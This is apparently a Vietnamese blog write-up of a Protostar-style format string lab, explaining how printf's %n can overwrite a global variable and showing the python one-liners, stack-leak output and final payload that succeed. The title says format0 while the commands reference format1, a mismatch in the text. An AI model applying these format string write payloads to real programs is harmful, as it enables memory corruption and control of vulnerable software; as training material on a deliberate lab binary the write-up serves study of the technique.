---
layout: post
title: format0
---

Trong bài này, chúng ta sẽ dùng `printf` để exploit chương trình.
Mặc dù `printf` chỉ là hàm để in ra màn hình, nó vẫn có khả năng đọc và lưu giá trị vào bộ nhớ thông qua formatted string có chứa `%n`.

Sau đây là source code và asm code của chương trình format0.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
```asm
0x080483f4 <vuln+0>:    push   ebp
0x080483f5 <vuln+1>:    mov    ebp,esp
0x080483f7 <vuln+3>:    sub    esp,0x18
0x080483fa <vuln+6>:    mov    eax,DWORD PTR [ebp+0x8]
0x080483fd <vuln+9>:    mov    DWORD PTR [esp],eax
0x08048400 <vuln+12>:   call   0x8048320 <printf@plt>
0x08048405 <vuln+17>:   mov    eax,ds:0x8049638
0x0804840a <vuln+22>:   test   eax,eax
0x0804840c <vuln+24>:   je     0x804841a <vuln+38>
0x0804840e <vuln+26>:   mov    DWORD PTR [esp],0x8048500
0x08048415 <vuln+33>:   call   0x8048330 <puts@plt>
0x0804841a <vuln+38>:   leave
0x0804841b <vuln+39>:   ret
0x0804841c <main+0>:    push   ebp
0x0804841d <main+1>:    mov    ebp,esp
0x0804841f <main+3>:    and    esp,0xfffffff0
0x08048422 <main+6>:    sub    esp,0x10
0x08048425 <main+9>:    mov    eax,DWORD PTR [ebp+0xc]
0x08048428 <main+12>:   add    eax,0x4
0x0804842b <main+15>:   mov    eax,DWORD PTR [eax]
0x0804842d <main+17>:   mov    DWORD PTR [esp],eax
0x08048430 <main+20>:   call   0x80483f4 <vuln>
0x08048435 <main+25>:   leave
0x08048436 <main+26>:   ret
```

Mục tiêu của bài này là dùng `printf` để thay đổi giá trị của một biến lưu ở bất kỳ đâu, không chỉ giới hạn trong stack.
Từ source code ta thấy rằng hàm `printf` dễ dàng bị sử dụng sai vì chỉ có một tham số duy nhất.
Bằng cách yêu cầu thêm tham số, cụ thể là `%n` như đã đề cập, chương trình sẽ được exploit.
Khi phải xử lý nhiều tham số, `printf` sẽ đọc giá trị từ lưu trên stack, lần lượt từ `esp`.
Đối với `%n`, `printf` sẽ sử dụng giá trị trên stack làm pointer để lưu giá trị mới vào đó.
Như vậy, nếu muốn thay đổi biến `target`, trước tiên cần tìm ra địa chỉ lưu biến này.
Để tìm được địa chỉ, bạn có thể dùng objdump như gợi ý hoặc đọc từ asm code của chương trình.

```bash
objdump -t /opt/protostar/bin/format1 | grep target
```

Kết quả cho thấy `target` được lưu tại `0x08049638`.
Như vậy, formatted string sẽ phải có 4 byte địa chỉ này.
Tiếp theo, chúng ta sẽ cần biết khoảng cách giữa `esp` khi hàm `printf` được gọi và địa chỉ của formatted string.
Cách formatted string được lưu vào stack như sau:
1. Bắt đầu từ `ebp`, lưu theo chiều push stack, nghĩa là giá trị cuối cùng, ký tự null-terminated lưu tại `ebp - 0x1`. Giá trị đầu tiên cũng là địa chỉ sẽ lưu tại `ebp - độ dài chuỗi`
2. Ta sẽ có 1 khoảng cách cố định từ địa chỉ formatted string đến `esp` hiện tại, kèm theo padding của chương trình (để làm tròn `esp` về dạng `0xyyyyyyy0`).

Để biết được khoảng cách này, chúng ta có thể sử dụng phương pháp thử thay thế liên tiếp các giá trị từ stack vào formatted string.
Điều này tương tự với việc sử dụng rất nhiều tham số cho hàm `printf`.
Sau đây là một ví dụ.

```bash
python -c "print 'AAAA' + '%x.' * 200"
```

Đoạn formatted string này cho phép hàm `printf` đọc 200 dword với địa chỉ bắt đầu `esp + 4` (không kể địa chỉ của formatted string này tại `esp`).
Sau khi đọc và in ra chuỗi, chúng ta sẽ tìm được vị trí mà formatted string này được lưu, bằng cách tìm vị trí mà giá trị `0x41414141` (tương đương với chuỗi `AAAA`) trong chuỗi in ra.
Dưới đây là ví dụ về chuỗi in ra. Đoạn giá trị cần tìm được <span style="color:aqua">highlight</span>.

```bash
AAAA804960c.bffff568.8048469.b7fd8304.b7fd7ff4.bffff568.8048435.bffff732.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff5e8.b7eadc76.2.bffff614.bffff620.b7fe1848.bffff5d0.ffffffff.b7ffeff4.804824d.1.bffff5d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff5e8.b9394216.936bd406.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff614.8048450.8048440.b7ff1040.bffff60c.b7fff8f8.2.bffff72a.bffff732.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff70b.1f.bfffffe1.f.bffff71b.0.0.0.8a000000.d18b3605.c6b4a369.b1fa337a.6931d8ec.363836.0.0.6f660000.74616d72.<span style="color:aqua">4141</span>0031.7825<span style="color:aqua">4141</span>.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
```

Vị trí tìm được tương đương với `esp + 0x202`. Khoảng cách này là 514 byte.
Chúng ta cũng nhận thấy sẽ có 2 byte lẻ do hiệu ứng của padding, khiến cho chuỗi bắt đầu `AAAA` bị tách ra làm 2 như đã highlight.
Để tránh bị mis-aligned, chúng ta sẽ thêm 2 byte vào formatted string.
Độ dài mới sẽ là 4 byte `AAAA`, 3 byte `%x.` lặp lại 200 lần, 2 byte padding, và 1 byte null-terminated. Tổng là 607 byte.

```bash
python -c "print 'AAAA' + '%x.' * 200 + 'aa'"
```
```bash
AAAA804960c.bffff568.8048469.b7fd8304.b7fd7ff4.bffff568.8048435.bffff730.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff5e8.b7eadc76.2.bffff614.bffff620.b7fe1848.bffff5d0.ffffffff.b7ffeff4.804824d.1.bffff5d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff5e8.530c9d5c.795e0b4c.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff614.8048450.8048440.b7ff1040.bffff60c.b7fff8f8.2.bffff728.bffff730.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff70b.1f.bfffffe1.f.bffff71b.0.0.0.ab000000.3e356350.d411d673.672da4f7.69e29a20.363836.0.0.6d726f66.317461.<span style="color:aqua">41414141</span>.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
```

Với formatted string mới này, các byte đã về đúng vị trí.
Tiếp theo, chúng ta sẽ điều chỉnh số lần đọc từ stack, để đến điều chỉnh `esp` về đúng vị trị trên stack chứa địa chỉ của `target`, cụ thể là về đầu của formatted string.
Có thể nhận thấy, nếu đọc 0 dword, `esp` sẽ dịch 4 byte.
Tương tự, nếu đọc 1 dword, `esp` sẽ dịch 8 byte.
Tiếp tục như vậy, nếu đọc 127 dword, `esp` sẽ dịch ngay tại địa chỉ của formatted string (mà trong ví dị này bắt đầu bằng chuỗi `AAAA` hay `0x41414141`).

Theo như phân tích, chúng ta sẽ giảm số lần lặp lại của `%x.` đi còn 127 lần, và tính lại byte padding.
Cụ thể, nếu không có byte padding thì tổng độ dài sẽ là 4 + 3 * 127 + 1 = 386. Chênh lêch so với trước đây là 221.
Số chênh lệch này chia 4 dư 1. Cho nên ta sẽ thêm 1 byte padding vào độ dài formatted string.
Cuối cùng, ta sẽ đổi chuổi thành.

```bash
python -c "print 'AAAA' + '%x.' * 127 + 'a'"
```
```bash
AAAA804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff80c.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.3ba998e9.11fd4ef9.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff804.bffff80c.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.4b000000.9c80dc29.b2cb6222.7ef80e2c.696901de.363836.0.6d726f66.317461.41414141.a
```

Tuy nhiên khi kiểm tra chuỗi mới này, `0x41414141` vẫn xuất hiện.
Hiện tượng này là do sau khi thay đổi độ dài chuỗi, padding do điều chỉnh `esp` bằng lệnh `esp & 0xfffffff0` đã làm mất đi 8 byte padding.
Như vậy chúng ta sẽ phải điều chỉnh thêm 1 lượt nữa bằng cách giảm số lần lặp `%x.` đi thêm 1 lần.
Tính lại độ dài chuỗi, ta được tổng là 4 + 3 * 126 + 1 = 383, chênh lệch là 224 byte và cần thêm 0 byte padding.

```bash
python -c "print 'AAAA' + '%x.' * 126"
```
```bash
AAAA804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff810.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.663cd21e.4c68040e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff808.bffff810.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.9c000000.395f7251.2db0cce8.81033fbf.69335b0b.363836.0.0.6d726f66.
```

Chuỗi `0x41414141` đã không xuất hiện. Có vẻ như chúng ta đã chỉnh chính xác vị trí `esp`.
Để kiểm tra lại đáp án cuối cùng, thay `AAAA` bằng địa chỉ của `target` là `0x08049638` và thêm `%n` vào cuối để bắt đầu quá trình ghi.
Việc thay thế 4 byte đầu bằng 4 byte khác không làm ảnh hưởng đến padding.
Tuy nhiên, việc thêm 2 byte `%n` yêu cầu phải thêm 2 byte padding nữa để đảm bảo chênh lệch chia hết cho 4.
Kết quả ta được.

```bash
python -c "print '\x38\x96\x04\x08' + '%x.' * 126 + '%n' + 'a\n'"
```
```bash
8804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff80c.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.97f7272f.bda3f13f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff804.bffff80c.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.a7000000.c336e748.2128340d.193064ab.69d4c2b3.363836.0.6d726f66.317461.aayou have modified the target :)
```

Mục tiêu đã hoàn thành!

Các bạn có thể tham khảo các đáp án khác trong phần cuối bài. Lưu ý, chạy chương trình trong gdb sẽ cần đáp án khác với chạy trực tiếp, do khoảng cách giữa `esp` và địa chỉ của formatted string khác nhau.

## Ref
```bash
user@protostar:~$ format0 $(python -c "print '%064d\xef\xbe\xad\xde'")
you have hit the target correctly :)
```
